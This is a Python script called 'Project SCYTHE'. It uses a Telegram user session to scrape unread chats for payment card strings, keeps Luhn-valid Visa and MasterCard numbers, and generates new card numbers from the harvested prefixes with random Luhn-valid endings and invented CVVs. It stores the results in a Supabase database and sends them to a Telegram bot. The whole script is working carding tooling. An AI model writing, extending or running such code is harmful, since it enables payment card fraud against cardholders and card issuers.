import os
import re
import asyncio
import tempfile
import requests
import random
from telethon import TelegramClient
from telethon.sessions import StringSession
from supabase import create_client, Client
from dotenv import load_dotenv

# Load configuration
load_dotenv('local_secrets.env')

# Telegram Config
API_ID = os.getenv('API_ID')
API_HASH = os.getenv('API_HASH')
SESSION_STRING = os.getenv('SESSION_STRING')

# Telegram Bot Config for Notifications
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
TELEGRAM_MSG_ID = os.getenv('TELEGRAM_MSG_ID')

# Supabase Config
SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_SECRET_KEY') # Needs the service/secret key for write access

# Regex for card patterns
CARD_REGEX = r'(\d{14,16}\|\d{1,2}\|\d{2,4}(?:\|\d{3,4})?\|?)'

def is_luhn_valid(number):
    """Standard Luhn MOD-10 algorithm."""
    digits = [int(d) for d in str(number)]
    checksum = 0
    reverse_digits = digits[::-1]
    for i, d in enumerate(reverse_digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

def generate_luhn_valid_extrap(prefix, target_len=16):
    """Generates a random valid suffix that satisfies the Luhn algorithm."""
    suffix_len = target_len - len(prefix)
    if suffix_len <= 0: return prefix
    
    while True:
        # Generate target_len - 1 digits
        mid_suffix = "".join([str(random.randint(0, 9)) for _ in range(suffix_len - 1)])
        candidate_prefix = prefix + mid_suffix
        
        # Calculate check digit
        digits = [int(d) for d in candidate_prefix]
        total_sum = 0
        for i, d in enumerate(reversed(digits)):
            # Double every second digit from the right (check digit is at index 0 from right)
            if i % 2 == 0:
                d *= 2
                if d > 9: d -= 9
            total_sum += d
        
        check_digit = (10 - (total_sum % 10)) % 10
        return candidate_prefix + str(check_digit)

def generate_progress_bar(current, total, length=10):
    if total == 0: return "⚪" * length + " 0%"
    percent = (current / total)
    filled_length = int(length * percent)
    bar = "🔵" * filled_length + "⚪" * (length - filled_length)
    return f"{bar} {int(percent * 100)}%"

async def send_to_telegram_bot(cards):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram Bot config missing. Skipping notification.")
        return

    try:
        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as tmp:
            tmp.write("\n".join(cards))
            tmp_path = tmp.name

        url = f"https://api.github.com/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        # Wait, the URL for Telegram Bot API is different
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        with open(tmp_path, 'rb') as f:
            files = {'document': ('scythe_vectors.txt', f)}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🚨 SCYTHE: {len(cards)} New Vectors Extracted! 🚨"}
            response = requests.post(url, data=data, files=files)
            
        os.unlink(tmp_path)
        
        if response.status_code == 200:
            print("Telegram Bot notification sent successfully.")
        else:
            print(f"Failed to send Telegram notification: {response.text}")
    except Exception as e:
        print(f"Error sending to Telegram bot: {e}")

async def cloud_mission():
    print("--- [ Project SCYTHE: Cloud Extraction Core ] ---")
    
    if not SESSION_STRING:
        print("Error: SESSION_STRING missing.")
        return

    # Initialize Supabase
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

    # Initialize Telegram Client with StringSession
    client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
    
    await client.connect()
    if not await client.is_user_authorized():
        print("Error: Session string is invalid or expired.")
        return
        
    print("Authenticated successfully via Cloud Session.")

    # Track status for Live Radar
    current_status_id = TELEGRAM_MSG_ID # Use the ID passed from Webhook if available
    async def update_radar(text):
        nonlocal current_status_id
        if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID: return
        
        try:
            if current_status_id is None:
                r = requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                                  json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"})
                current_status_id = r.json().get('result', {}).get('message_id')
            else:
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText", 
                              json={"chat_id": TELEGRAM_CHAT_ID, "message_id": current_status_id, "text": text, "parse_mode": "Markdown"})
        except Exception as e:
            print(f"Update failed: {e}")

    await update_radar("🛰️ **SCYTHE MISSION: CONNECTED**\n---\n⚙️ **Status**: Initializing Orbit...")
    await asyncio.sleep(1) # For visual effect

    cards_found = []
    total_processed = 0

    print("Scanning all dialogs for unread content...")
    
    # Pre-count dialogs for progress %
    dialog_list = []
    async for d in client.iter_dialogs():
        if d.unread_count > 0:
            dialog_list.append(d)
    
    total_groups = len(dialog_list)

    for idx, dialog in enumerate(dialog_list):
            count = dialog.unread_count
            print(f"Scrubbing: {dialog.name} ({count} unread)")
            
            # Progress Update with Bar
            progress_bar = generate_progress_bar(idx + 1, total_groups)
            status_text = (
                f"🛰️ **SCYTHE MISSION RADAR (V2)**\n"
                f"---"
                f"\n📡 **Target**: `{dialog.name}`"
                f"\n📊 **Mission Progress**: {progress_bar}"
                f"\n💎 **Vectors Caught**: `{len(cards_found)}`"
                f"\n⚙️ **Status**: Scrubbing Vectors..."
            )
            await update_radar(status_text)
            
            processed_in_dialog = 0
            max_id = 0
            
            async for msg in client.iter_messages(dialog.id, limit=count):
                processed_in_dialog += 1
                if msg.id > max_id:
                    max_id = msg.id
                
                if msg.text:
                    matches = re.findall(CARD_REGEX, msg.text)
                    if matches:
                        for card in matches:
                            # Normalize year (e.g. 28 -> 2028)
                            parts = card.split('|')
                            if len(parts) >= 3:
                                # First, clean the card number
                                card_num = parts[0].strip()
                                
                                # Filter: Only Visa (4) or MasterCard (5)
                                if not (card_num.startswith('4') or card_num.startswith('5')):
                                    continue # Skip Amex, Discover, etc.

                                if not is_luhn_valid(card_num):
                                    continue # Skip invalid vectors
                                
                                # Extrapolate: Replace last 4 with random valid suffix
                                if len(card_num) >= 15:
                                    prefix = card_num[:-4]
                                    parts[0] = generate_luhn_valid_extrap(prefix, target_len=len(card_num))
                                
                                # Year normalization
                                year = parts[2].strip()
                                if len(year) == 2:
                                    parts[2] = "20" + year
                                
                                # CVV Injection Logic
                                if len(parts) < 4 or not parts[3].strip():
                                    injected_cvv = "".join([str(random.randint(0, 9)) for _ in range(3)])
                                    if len(parts) < 4:
                                        parts.append(injected_cvv)
                                    else:
                                        parts[3] = injected_cvv
                                
                                # Finalize vector
                                card = "|".join([p.strip() for p in parts if p.strip()]) 
                            
                            cards_found.append(card)
                            # Update count every 5 cards for extra "liveness"
                            if len(cards_found) % 5 == 0:
                                await update_radar(status_text)
                
                if processed_in_dialog % 500 == 0:
                    print(f"  > Progress: {processed_in_dialog}/{count} processed...")

            total_processed += processed_in_dialog
            
            if max_id:
                await client.send_read_acknowledge(dialog.id, max_id=max_id)
            print(f"  > [DONE] {dialog.name} synchronized.")

    # Finalize Radar before sending file
    await update_radar(
        f"✅ **SCYTHE MISSION SUCCESSFUL**\n"
        f"---"
        f"\n💎 **Total Vectors**: `{len(set(cards_found))}`"
        f"\n📂 **Groups Cleaned**: `{total_groups}`"
        f"\n⚙️ **Core Status**: Standby"
    )

    # Deduplicate and sync to Supabase
    if cards_found:
        unique_cards = list(dict.fromkeys(cards_found))
        print(f"Syncing {len(unique_cards)} unique cards to Supabase...")
        
        for card in unique_cards:
            try:
                # Insert if not exists (using upsert logic or just ignoring errors for duplicates)
                supabase.table("cards").upsert({"card_data": card}).execute()
            except Exception as e:
                # Likely a duplicate error if not using upsert properly, we can ignore
                pass
                
        print("Success: Database synchronized.")
        # Release the mission lock
        try:
            supabase.table("system_settings").upsert({"key": "scraper_locked", "value": "false"}).execute()
        except: pass
        # Send to Telegram Bot as .txt attachment
        await send_to_telegram_bot(unique_cards)
    else:
        print("No new cards found.")

    print(f"Mission Complete: {total_processed} messages processed.")
    await client.disconnect()

if __name__ == '__main__':
    asyncio.run(cloud_mission())
